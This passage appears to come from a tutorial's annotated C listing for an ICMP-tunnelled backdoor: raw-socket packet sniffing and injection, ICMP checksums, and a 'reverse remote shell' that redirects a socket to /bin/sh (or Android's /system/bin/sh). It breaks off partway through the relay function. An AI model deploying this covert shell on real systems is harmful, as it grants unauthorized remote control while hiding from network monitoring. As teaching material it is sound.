    <span id="cb230-61"><a href="#cb230-61" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> PKT_TX<span class="op">;</span></span>
    <span id="cb230-62"><a href="#cb230-62" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-63"><a href="#cb230-63" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="kw">struct</span> sockaddr_in dest<span class="op">;</span></span>
    <span id="cb230-64"><a href="#cb230-64" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-65"><a href="#cb230-65" aria-hidden="true" tabindex="-1"></a><span class="co">// Creates a RAW socket. The same RAW socket will be</span></span>
    <span id="cb230-66"><a href="#cb230-66" aria-hidden="true" tabindex="-1"></a><span class="co">// used to write our sniffer (to capture the ICMP</span></span>
    <span id="cb230-67"><a href="#cb230-67" aria-hidden="true" tabindex="-1"></a><span class="co">// traffic) and also to inject our ICMP requests with</span></span>
    <span id="cb230-68"><a href="#cb230-68" aria-hidden="true" tabindex="-1"></a><span class="co">// our own data.</span></span>
    <span id="cb230-69"><a href="#cb230-69" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-70"><a href="#cb230-70" aria-hidden="true" tabindex="-1"></a><span class="co">// Two parameters, the first one is the destination IP of</span></span>
    <span id="cb230-71"><a href="#cb230-71" aria-hidden="true" tabindex="-1"></a><span class="co">// our ICMP packets. The second is the protocol, by</span></span>
    <span id="cb230-72"><a href="#cb230-72" aria-hidden="true" tabindex="-1"></a><span class="co">// default we have selected ICMP.</span></span>
    <span id="cb230-73"><a href="#cb230-73" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-74"><a href="#cb230-74" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-75"><a href="#cb230-75" aria-hidden="true" tabindex="-1"></a><span class="co">// Returns a file descriptor representing the raw socket</span></span>
    <span id="cb230-76"><a href="#cb230-76" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb230-77"><a href="#cb230-77" aria-hidden="true" tabindex="-1"></a>raw_init <span class="op">(</span><span class="dt">char</span> <span class="op">*</span>ip<span class="op">,</span> <span class="dt">int</span> proto<span class="op">)</span></span>
    <span id="cb230-78"><a href="#cb230-78" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-79"><a href="#cb230-79" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> s<span class="op">;</span></span>
    <span id="cb230-80"><a href="#cb230-80" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-81"><a href="#cb230-81" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>s <span class="op">=</span> socket <span class="op">(</span>AF_INET<span class="op">,</span> SOCK_RAW<span class="op">,</span> proto<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb230-82"><a href="#cb230-82" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-83"><a href="#cb230-83" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;socket:&quot;</span><span class="op">);</span></span>
    <span id="cb230-84"><a href="#cb230-84" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb230-85"><a href="#cb230-85" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-86"><a href="#cb230-86" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-87"><a href="#cb230-87" aria-hidden="true" tabindex="-1"></a>        dest<span class="op">.</span>sin_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
    <span id="cb230-88"><a href="#cb230-88" aria-hidden="true" tabindex="-1"></a>        inet_aton <span class="op">(</span>ip<span class="op">,</span> <span class="op">&amp;</span>dest<span class="op">.</span>sin_addr<span class="op">);</span></span>
    <span id="cb230-89"><a href="#cb230-89" aria-hidden="true" tabindex="-1"></a>        fprintf <span class="op">(</span>stderr<span class="op">,</span> <span class="st">&quot;+ Raw to &#39;%s&#39; (type : %d)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> ip<span class="op">,</span> icmp_type<span class="op">);</span></span>
    <span id="cb230-90"><a href="#cb230-90" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-91"><a href="#cb230-91" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> s<span class="op">;</span></span>
    <span id="cb230-92"><a href="#cb230-92" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-93"><a href="#cb230-93" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-94"><a href="#cb230-94" aria-hidden="true" tabindex="-1"></a><span class="co">/* ICMP */</span></span>
    <span id="cb230-95"><a href="#cb230-95" aria-hidden="true" tabindex="-1"></a>u_short</span>
    <span id="cb230-96"><a href="#cb230-96" aria-hidden="true" tabindex="-1"></a>icmp_cksum <span class="op">(</span>u_char <span class="op">*</span>addr<span class="op">,</span> <span class="dt">int</span> len<span class="op">)</span></span>
    <span id="cb230-97"><a href="#cb230-97" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-98"><a href="#cb230-98" aria-hidden="true" tabindex="-1"></a>        <span class="dt">register</span> <span class="dt">int</span> sum <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-99"><a href="#cb230-99" aria-hidden="true" tabindex="-1"></a>        u_short answer <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-100"><a href="#cb230-100" aria-hidden="true" tabindex="-1"></a>        u_short <span class="op">*</span>wp<span class="op">;</span></span>
    <span id="cb230-101"><a href="#cb230-101" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-102"><a href="#cb230-102" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> <span class="op">(</span>wp <span class="op">=</span> <span class="op">(</span>u_short<span class="op">*)</span>addr<span class="op">;</span> len <span class="op">&gt;</span> <span class="dv">1</span><span class="op">;</span> wp<span class="op">++,</span> len <span class="op">-=</span> <span class="dv">2</span><span class="op">)</span></span>
    <span id="cb230-103"><a href="#cb230-103" aria-hidden="true" tabindex="-1"></a>                sum <span class="op">+=</span> <span class="op">*</span>wp<span class="op">;</span></span>
    <span id="cb230-104"><a href="#cb230-104" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-105"><a href="#cb230-105" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Take in an odd byte if present */</span></span>
    <span id="cb230-106"><a href="#cb230-106" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>len <span class="op">==</span> <span class="dv">1</span><span class="op">)</span></span>
    <span id="cb230-107"><a href="#cb230-107" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-108"><a href="#cb230-108" aria-hidden="true" tabindex="-1"></a>                <span class="op">*(</span>u_char <span class="op">*)&amp;</span>answer <span class="op">=</span> <span class="op">*(</span>u_char<span class="op">*)</span>wp<span class="op">;</span></span>
    <span id="cb230-109"><a href="#cb230-109" aria-hidden="true" tabindex="-1"></a>                sum <span class="op">+=</span> answer<span class="op">;</span></span>
    <span id="cb230-110"><a href="#cb230-110" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-111"><a href="#cb230-111" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-112"><a href="#cb230-112" aria-hidden="true" tabindex="-1"></a>        sum <span class="op">=</span> <span class="op">(</span>sum <span class="op">&gt;&gt;</span> <span class="dv">16</span><span class="op">)</span> <span class="op">+</span> <span class="op">(</span>sum <span class="op">&amp;</span> <span class="bn">0xffff</span><span class="op">);</span> <span class="co">/* add high 16 to low 16 */</span></span>
    <span id="cb230-113"><a href="#cb230-113" aria-hidden="true" tabindex="-1"></a>        sum <span class="op">+=</span> <span class="op">(</span>sum <span class="op">&gt;&gt;</span> <span class="dv">16</span><span class="op">);</span>             <span class="co">/* add carry */</span></span>
    <span id="cb230-114"><a href="#cb230-114" aria-hidden="true" tabindex="-1"></a>        answer <span class="op">=</span> <span class="op">~</span>sum<span class="op">;</span>                  <span class="co">/* truncate to 16 bits */</span></span>
    <span id="cb230-115"><a href="#cb230-115" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-116"><a href="#cb230-116" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> answer<span class="op">;</span></span>
    <span id="cb230-117"><a href="#cb230-117" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-118"><a href="#cb230-118" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-119"><a href="#cb230-119" aria-hidden="true" tabindex="-1"></a><span class="co">// packet sniffer,</span></span>
    <span id="cb230-120"><a href="#cb230-120" aria-hidden="true" tabindex="-1"></a><span class="co">// As packets used in this example have a fixed size, we can</span></span>
    <span id="cb230-121"><a href="#cb230-121" aria-hidden="true" tabindex="-1"></a><span class="co">// just read then in one shot (note that this may have issues</span></span>
    <span id="cb230-122"><a href="#cb230-122" aria-hidden="true" tabindex="-1"></a><span class="co">// in a heavily loaded network), and then we just check the</span></span>
    <span id="cb230-123"><a href="#cb230-123" aria-hidden="true" tabindex="-1"></a><span class="co">// ICMP message type and id. This is the way we mark our packets</span></span>
    <span id="cb230-124"><a href="#cb230-124" aria-hidden="true" tabindex="-1"></a><span class="co">// to know they are ours and not a regular ICMP message.</span></span>
    <span id="cb230-125"><a href="#cb230-125" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-126"><a href="#cb230-126" aria-hidden="true" tabindex="-1"></a><span class="co">// An alternative is to add a magic word just before the len in</span></span>
    <span id="cb230-127"><a href="#cb230-127" aria-hidden="true" tabindex="-1"></a><span class="co">// the data part of the packet and check that value to identify</span></span>
    <span id="cb230-128"><a href="#cb230-128" aria-hidden="true" tabindex="-1"></a><span class="co">// the packet.</span></span>
    <span id="cb230-129"><a href="#cb230-129" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-130"><a href="#cb230-130" aria-hidden="true" tabindex="-1"></a><span class="co">// If the packet is ours (and not a normal ICMP packet), the</span></span>
    <span id="cb230-131"><a href="#cb230-131" aria-hidden="true" tabindex="-1"></a><span class="co">// data is copied in the provided buffer and its length is</span></span>
    <span id="cb230-132"><a href="#cb230-132" aria-hidden="true" tabindex="-1"></a><span class="co">// returned. The async_read function takes care of the rest from</span></span>
    <span id="cb230-133"><a href="#cb230-133" aria-hidden="true" tabindex="-1"></a><span class="co">// this point on.</span></span>
    <span id="cb230-134"><a href="#cb230-134" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-135"><a href="#cb230-135" aria-hidden="true" tabindex="-1"></a><span class="co">// Returns the length of the packet received or 0</span></span>
    <span id="cb230-136"><a href="#cb230-136" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb230-137"><a href="#cb230-137" aria-hidden="true" tabindex="-1"></a>net_read_icmp <span class="op">(</span><span class="dt">int</span> s<span class="op">,</span> <span class="dt">void</span> <span class="op">*</span>buf<span class="op">,</span> <span class="dt">size_t</span> count<span class="op">)</span></span>
    <span id="cb230-138"><a href="#cb230-138" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-139"><a href="#cb230-139" aria-hidden="true" tabindex="-1"></a>        PKT pkt<span class="op">;</span></span>
    <span id="cb230-140"><a href="#cb230-140" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> len<span class="op">,</span> l<span class="op">;</span></span>
    <span id="cb230-141"><a href="#cb230-141" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-142"><a href="#cb230-142" aria-hidden="true" tabindex="-1"></a>        l <span class="op">=</span> read <span class="op">(</span>s<span class="op">,</span> <span class="op">&amp;</span>pkt<span class="op">,</span> <span class="kw">sizeof</span> <span class="op">(</span>PKT<span class="op">));</span> <span class="co">// Read IP + ICMP header</span></span>
    <span id="cb230-143"><a href="#cb230-143" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>pkt<span class="op">.</span>icmp<span class="op">.</span>type <span class="op">==</span> icmp_type<span class="op">)</span> <span class="op">&amp;&amp;</span></span>
    <span id="cb230-144"><a href="#cb230-144" aria-hidden="true" tabindex="-1"></a>            <span class="op">(</span>ntohs<span class="op">(</span>pkt<span class="op">.</span>icmp<span class="op">.</span>un<span class="op">.</span>echo<span class="op">.</span>id<span class="op">)</span> <span class="op">==</span> id<span class="op">))</span></span>
    <span id="cb230-145"><a href="#cb230-145" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-146"><a href="#cb230-146" aria-hidden="true" tabindex="-1"></a>                len <span class="op">=</span> ntohs <span class="op">(</span>pkt<span class="op">.</span>len<span class="op">);</span></span>
    <span id="cb230-147"><a href="#cb230-147" aria-hidden="true" tabindex="-1"></a>                memcpy <span class="op">(</span>buf<span class="op">,</span> <span class="op">(</span><span class="dt">char</span><span class="op">*)</span>pkt<span class="op">.</span>data<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb230-148"><a href="#cb230-148" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> len<span class="op">;</span></span>
    <span id="cb230-149"><a href="#cb230-149" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-150"><a href="#cb230-150" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-151"><a href="#cb230-151" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-152"><a href="#cb230-152" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-153"><a href="#cb230-153" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-154"><a href="#cb230-154" aria-hidden="true" tabindex="-1"></a><span class="co">// packet injector,</span></span>
    <span id="cb230-155"><a href="#cb230-155" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-156"><a href="#cb230-156" aria-hidden="true" tabindex="-1"></a><span class="co">// For RAW sockets, were we are not binding the socket</span></span>
    <span id="cb230-157"><a href="#cb230-157" aria-hidden="true" tabindex="-1"></a><span class="co">// to any address and there is no accept or connect involved,</span></span>
    <span id="cb230-158"><a href="#cb230-158" aria-hidden="true" tabindex="-1"></a><span class="co">// we have to use the datagram primitives. The sendto system</span></span>
    <span id="cb230-159"><a href="#cb230-159" aria-hidden="true" tabindex="-1"></a><span class="co">// call allows us to send data to a specific address, in this</span></span>
    <span id="cb230-160"><a href="#cb230-160" aria-hidden="true" tabindex="-1"></a><span class="co">// case to the IP address we passed to the program as parameter.</span></span>
    <span id="cb230-161"><a href="#cb230-161" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-162"><a href="#cb230-162" aria-hidden="true" tabindex="-1"></a><span class="co">// Note: we are not setting the IP header so this is the way we</span></span>
    <span id="cb230-163"><a href="#cb230-163" aria-hidden="true" tabindex="-1"></a><span class="co">// provide the destination IP address to the TCP/IP stack.</span></span>
    <span id="cb230-164"><a href="#cb230-164" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb230-165"><a href="#cb230-165" aria-hidden="true" tabindex="-1"></a>net_write_icmp <span class="op">(</span><span class="dt">int</span> s<span class="op">,</span> <span class="dt">void</span> <span class="op">*</span>buf<span class="op">,</span> <span class="dt">size_t</span> count<span class="op">)</span></span>
    <span id="cb230-166"><a href="#cb230-166" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-167"><a href="#cb230-167" aria-hidden="true" tabindex="-1"></a>        PKT_TX          <span class="op">*</span>pkt<span class="op">;</span></span>
    <span id="cb230-168"><a href="#cb230-168" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> icmphdr <span class="op">*</span>icmp <span class="op">=</span> <span class="op">(</span><span class="kw">struct</span> icmphdr<span class="op">*)</span> <span class="op">&amp;</span>pkt<span class="op">;</span></span>
    <span id="cb230-169"><a href="#cb230-169" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> len<span class="op">;</span></span>
    <span id="cb230-170"><a href="#cb230-170" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-171"><a href="#cb230-171" aria-hidden="true" tabindex="-1"></a>        <span class="co">// dynamically allocate the packet including the</span></span>
    <span id="cb230-172"><a href="#cb230-172" aria-hidden="true" tabindex="-1"></a>        <span class="co">// size of the buffer we want to transmit</span></span>
    <span id="cb230-173"><a href="#cb230-173" aria-hidden="true" tabindex="-1"></a>        pkt <span class="op">=</span> malloc <span class="op">(</span><span class="kw">sizeof</span> <span class="op">(</span>PKT_TX<span class="op">)</span> <span class="op">+</span> count<span class="op">);</span></span>
    <span id="cb230-174"><a href="#cb230-174" aria-hidden="true" tabindex="-1"></a>        icmp <span class="op">=</span> <span class="op">(</span><span class="kw">struct</span> icmphdr<span class="op">*)</span> pkt<span class="op">;</span></span>
    <span id="cb230-175"><a href="#cb230-175" aria-hidden="true" tabindex="-1"></a>        pkt<span class="op">-&gt;</span>len <span class="op">=</span> htons<span class="op">(</span>count<span class="op">);</span></span>
    <span id="cb230-176"><a href="#cb230-176" aria-hidden="true" tabindex="-1"></a>        <span class="co">// fill in the content</span></span>
    <span id="cb230-177"><a href="#cb230-177" aria-hidden="true" tabindex="-1"></a>        memcpy <span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span>pkt <span class="op">+</span> <span class="kw">sizeof</span><span class="op">(</span>PKT_TX<span class="op">),</span> buf<span class="op">,</span> count<span class="op">);</span></span>
    <span id="cb230-178"><a href="#cb230-178" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-179"><a href="#cb230-179" aria-hidden="true" tabindex="-1"></a>        len <span class="op">=</span> count <span class="op">+</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">int</span><span class="op">);</span></span>
    <span id="cb230-180"><a href="#cb230-180" aria-hidden="true" tabindex="-1"></a>        len <span class="op">+=</span> <span class="kw">sizeof</span> <span class="op">(</span><span class="kw">struct</span> icmphdr<span class="op">);</span></span>
    <span id="cb230-181"><a href="#cb230-181" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-182"><a href="#cb230-182" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Build an ICMP Packet */</span></span>
    <span id="cb230-183"><a href="#cb230-183" aria-hidden="true" tabindex="-1"></a>        <span class="co">// icmp_type and the id parameters are relevant since</span></span>
    <span id="cb230-184"><a href="#cb230-184" aria-hidden="true" tabindex="-1"></a>        <span class="co">// are used by our sniffer to identify our own packets.</span></span>
    <span id="cb230-185"><a href="#cb230-185" aria-hidden="true" tabindex="-1"></a>        icmp<span class="op">-&gt;</span>type <span class="op">=</span> icmp_type<span class="op">;</span></span>
    <span id="cb230-186"><a href="#cb230-186" aria-hidden="true" tabindex="-1"></a>        icmp<span class="op">-&gt;</span>code <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-187"><a href="#cb230-187" aria-hidden="true" tabindex="-1"></a>        icmp<span class="op">-&gt;</span>un<span class="op">.</span>echo<span class="op">.</span>id <span class="op">=</span> htons<span class="op">(</span>id<span class="op">);</span></span>
    <span id="cb230-188"><a href="#cb230-188" aria-hidden="true" tabindex="-1"></a>        icmp<span class="op">-&gt;</span>un<span class="op">.</span>echo<span class="op">.</span>sequence <span class="op">=</span> htons<span class="op">(</span><span class="dv">5</span><span class="op">);</span></span>
    <span id="cb230-189"><a href="#cb230-189" aria-hidden="true" tabindex="-1"></a>        <span class="co">// set the checksum field to zero and calculate the checksum</span></span>
    <span id="cb230-190"><a href="#cb230-190" aria-hidden="true" tabindex="-1"></a>        <span class="co">// for the packet</span></span>
    <span id="cb230-191"><a href="#cb230-191" aria-hidden="true" tabindex="-1"></a>        icmp<span class="op">-&gt;</span>checksum <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-192"><a href="#cb230-192" aria-hidden="true" tabindex="-1"></a>        icmp<span class="op">-&gt;</span>checksum <span class="op">=</span> icmp_cksum <span class="op">((</span><span class="dt">char</span><span class="op">*)</span>icmp<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb230-193"><a href="#cb230-193" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-194"><a href="#cb230-194" aria-hidden="true" tabindex="-1"></a>        sendto <span class="op">(</span>s<span class="op">,</span> pkt<span class="op">,</span> len<span class="op">,</span> <span class="dv">0</span><span class="op">,</span></span>
    <span id="cb230-195"><a href="#cb230-195" aria-hidden="true" tabindex="-1"></a>                <span class="op">(</span><span class="kw">struct</span> sockaddr<span class="op">*)</span> <span class="op">&amp;</span>dest<span class="op">,</span></span>
    <span id="cb230-196"><a href="#cb230-196" aria-hidden="true" tabindex="-1"></a>                <span class="kw">sizeof</span> <span class="op">(</span><span class="kw">struct</span> sockaddr_in<span class="op">));</span></span>
    <span id="cb230-197"><a href="#cb230-197" aria-hidden="true" tabindex="-1"></a>        free <span class="op">(</span>pkt<span class="op">);</span></span>
    <span id="cb230-198"><a href="#cb230-198" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> len<span class="op">;</span></span>
    <span id="cb230-199"><a href="#cb230-199" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-200"><a href="#cb230-200" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-201"><a href="#cb230-201" aria-hidden="true" tabindex="-1"></a><span class="co">// Function that allow us to implement a reverse remote shell.</span></span>
    <span id="cb230-202"><a href="#cb230-202" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-203"><a href="#cb230-203" aria-hidden="true" tabindex="-1"></a><span class="co">// It makes use of two system calls dup2 and execv. The first one</span></span>
    <span id="cb230-204"><a href="#cb230-204" aria-hidden="true" tabindex="-1"></a><span class="co">// duplicates a given file descriptor. In this case, the three</span></span>
    <span id="cb230-205"><a href="#cb230-205" aria-hidden="true" tabindex="-1"></a><span class="co">// calls at the beginning of the function, assigns the file</span></span>
    <span id="cb230-206"><a href="#cb230-206" aria-hidden="true" tabindex="-1"></a><span class="co">// descriptor received as parameter to the Standard Input (file</span></span>
    <span id="cb230-207"><a href="#cb230-207" aria-hidden="true" tabindex="-1"></a><span class="co">//  descriptor 0), Standard Output (file descriptor 1) and</span></span>
    <span id="cb230-208"><a href="#cb230-208" aria-hidden="true" tabindex="-1"></a><span class="co">// Standard Error (file descriptor 3).</span></span>
    <span id="cb230-209"><a href="#cb230-209" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-210"><a href="#cb230-210" aria-hidden="true" tabindex="-1"></a><span class="co">// If the file descriptor we pass as a parameter is one of the</span></span>
    <span id="cb230-211"><a href="#cb230-211" aria-hidden="true" tabindex="-1"></a><span class="co">// sockets created with our previous client and server functions,</span></span>
    <span id="cb230-212"><a href="#cb230-212" aria-hidden="true" tabindex="-1"></a><span class="co">// we are effectively sending and receiving data through the</span></span>
    <span id="cb230-213"><a href="#cb230-213" aria-hidden="true" tabindex="-1"></a><span class="co">// network every time we write data to the console and we read data</span></span>
    <span id="cb230-214"><a href="#cb230-214" aria-hidden="true" tabindex="-1"></a><span class="co">// from stdin.</span></span>
    <span id="cb230-215"><a href="#cb230-215" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-216"><a href="#cb230-216" aria-hidden="true" tabindex="-1"></a><span class="co">// Ported to ANDROID</span></span>
    <span id="cb230-217"><a href="#cb230-217" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb230-218"><a href="#cb230-218" aria-hidden="true" tabindex="-1"></a>start_shell <span class="op">(</span><span class="dt">int</span> s<span class="op">)</span></span>
    <span id="cb230-219"><a href="#cb230-219" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-220"><a href="#cb230-220" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">3</span><span class="op">];</span></span>
    <span id="cb230-221"><a href="#cb230-221" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-222"><a href="#cb230-222" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef VERBOSE</span></span>
    <span id="cb230-223"><a href="#cb230-223" aria-hidden="true" tabindex="-1"></a>        printf <span class="op">(</span><span class="st">&quot;+ Starting shell</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb230-224"><a href="#cb230-224" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span>
    <span id="cb230-225"><a href="#cb230-225" aria-hidden="true" tabindex="-1"></a>        dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb230-226"><a href="#cb230-226" aria-hidden="true" tabindex="-1"></a>        dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
    <span id="cb230-227"><a href="#cb230-227" aria-hidden="true" tabindex="-1"></a>        dup2 <span class="op">(</span>s<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
    <span id="cb230-228"><a href="#cb230-228" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-229"><a href="#cb230-229" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef _ANDROID</span></span>
    <span id="cb230-230"><a href="#cb230-230" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/system/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb230-231"><a href="#cb230-231" aria-hidden="true" tabindex="-1"></a><span class="pp">#else</span></span>
    <span id="cb230-232"><a href="#cb230-232" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb230-233"><a href="#cb230-233" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span>
    <span id="cb230-234"><a href="#cb230-234" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;-i&quot;</span><span class="op">;</span></span>
    <span id="cb230-235"><a href="#cb230-235" aria-hidden="true" tabindex="-1"></a>        name<span class="op">[</span><span class="dv">2</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb230-236"><a href="#cb230-236" aria-hidden="true" tabindex="-1"></a>        execv <span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name <span class="op">);</span></span>
    <span id="cb230-237"><a href="#cb230-237" aria-hidden="true" tabindex="-1"></a>        exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb230-238"><a href="#cb230-238" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-239"><a href="#cb230-239" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-240"><a href="#cb230-240" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-241"><a href="#cb230-241" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-242"><a href="#cb230-242" aria-hidden="true" tabindex="-1"></a><span class="co">// This function decode the information received from the network sends</span></span>
    <span id="cb230-243"><a href="#cb230-243" aria-hidden="true" tabindex="-1"></a><span class="co">// it to the shell using the counterpart socket (from the socketpair)</span></span>
    <span id="cb230-244"><a href="#cb230-244" aria-hidden="true" tabindex="-1"></a><span class="co">// system call.</span></span>
    <span id="cb230-245"><a href="#cb230-245" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-246"><a href="#cb230-246" aria-hidden="true" tabindex="-1"></a><span class="co">// At the same time, whenever the shell produces some output, this function</span></span>
    <span id="cb230-247"><a href="#cb230-247" aria-hidden="true" tabindex="-1"></a><span class="co">// will read that data, crypt it and send it over the network.</span></span>
    <span id="cb230-248"><a href="#cb230-248" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-249"><a href="#cb230-249" aria-hidden="true" tabindex="-1"></a><span class="co">// Receives as parameters two file descriptors, one representing the</span></span>
    <span id="cb230-250"><a href="#cb230-250" aria-hidden="true" tabindex="-1"></a><span class="co">// socketpair end for communications with the shell (s1) and the</span></span>
    <span id="cb230-251"><a href="#cb230-251" aria-hidden="true" tabindex="-1"></a><span class="co">// other for networking (s).</span></span>
    <span id="cb230-252"><a href="#cb230-252" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span></span>
    <span id="cb230-253"><a href="#cb230-253" aria-hidden="true" tabindex="-1"></a>async_read <span class="op">(</span><span class="dt">int</span> s<span class="op">,</span> <span class="dt">int</span> s1<span class="op">)</span></span>
    <span id="cb230-254"><a href="#cb230-254" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-255"><a href="#cb230-255" aria-hidden="true" tabindex="-1"></a>        fd_set rfds<span class="op">;</span></span>
    <span id="cb230-256"><a href="#cb230-256" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> timeval tv<span class="op">;</span></span>
    <span id="cb230-257"><a href="#cb230-257" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> max <span class="op">=</span> s <span class="op">&gt;</span> s1 <span class="op">?</span> s <span class="op">:</span> s1<span class="op">;</span></span>
